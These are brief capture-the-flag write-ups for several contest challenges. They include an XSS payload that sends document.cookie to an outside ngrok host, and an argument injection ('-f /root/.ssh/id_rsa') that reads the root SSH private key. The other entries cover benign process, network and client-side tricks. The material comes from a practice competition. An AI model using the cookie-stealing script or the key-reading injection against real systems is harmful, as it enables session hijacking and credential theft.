# "One Line" Writeups for Short Challenges

## (Web) Star Wars
It's literally just baby's first XSS how did this get rated medium

```html
<script>fetch("http://something.ngrok.io/xss?b="+btoa(document.cookie));</script>
```

## (Misc) Wordle Bash
There's an injection vulnerability when you tell the prompt that what they showed was incorrect. I feel like you could inject arbitrary code, but I just wasn't getting it to work. Luckily, if you use GTFOBins and submit `-f /root/.ssh/id_rsa`, you get the root ssh key, and you're good.

## (Misc) zombie
There's a suspended process with the flag in memory, the question is how do you read it if the file system is read-only.

```shell
grep -iRn flag{ /dev/PID/
cat /dev/PID/fd/3
```

## (Misc) flow
You could use your very real knowledge of AWS and give into our corporate overlords, or you could just guess on the first one, look at network requests, and see that the website made a request to `https://www.projectcircuitbreaker.com/wp-content/themes/project-circuit-breaker/dist/images/flowpuzzle/p1/p1-answer.png`. Change the numbers to view the other answer keys.

It was also all client side so you could have just read JavaScript instead.

## (Networking) No Big Deal
You'll need version 3.9 of this: https://github.com/NetworkBlockDevice/nbd

```
sudo modprobe nbd
sudo ./nbd-client challenge.nahamcon.com 31179 /dev/nbd0
sudo cat /dev/nbd0 # it's a png
sudo cp /dev/nbd0 ~/nbd0.png; sudo chown kali:kali ~/nbd0.png 
```

## (Mobile) JNinjaSpeak
just use strings lol